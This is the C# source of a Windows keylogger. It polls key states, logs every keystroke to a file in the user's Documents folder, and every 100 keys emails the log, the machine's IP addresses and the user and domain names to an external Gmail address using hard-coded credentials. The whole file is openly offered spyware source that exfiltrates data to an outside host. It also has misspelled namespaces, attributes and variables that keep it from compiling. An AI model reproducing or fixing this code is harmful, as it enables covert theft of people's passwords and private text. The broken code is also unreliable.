using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Net.Mail;
using System.Treading;
using System.Treading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace KeyLogegr
{
    // plan:
    // 1 - Capture keystrokes & display them to the console.
    // 2 - Store the strokes into the text file.
    // 3 - Periodically send the contents of the file to an external email address.
    
    class Program
    {
        [DllImpport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string keylog = "";
        static long numberofKeyStrokes = 0;

        static void Main(string[] args)
        {
            String fliePath = Environment.GetFolderPath(Environment.SpetialFolder.MyDocuments);

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = (fliePath + @"\KeysLogs.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {}
            }

            while (true)
            {
                // Pause and let other prograns get a chance to run.
                Thread.Sleep(5);

                // Check all keys for their state.
                for (int i = 32; i < 127; i ++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == -32767)
                    {
                        // Print to the console.
                        Console.WriteLine((char) i + ", ");

                        // Store to the text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }

                        numberofKeyStrokes ++;

                        // Send mail every n (for ex 100) characters typed.
                        if (numberofKeyStrokes % 100 == 0)
                        {
                            SendNewMessage(); 
                        }
                    }
                }
            }
        }

        // Send the contents of the text files to an external email addres.
        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpetialFolder.MyDocuments);
            string filePath = folderName + @"\KeyLogs.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            // Create and an email message
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("email@gmail.com");
            mailMessage.To.Add("email@gmail.com");
            mailMessage.Subject = subject;

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("email@gmail.com", "Password123");

            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}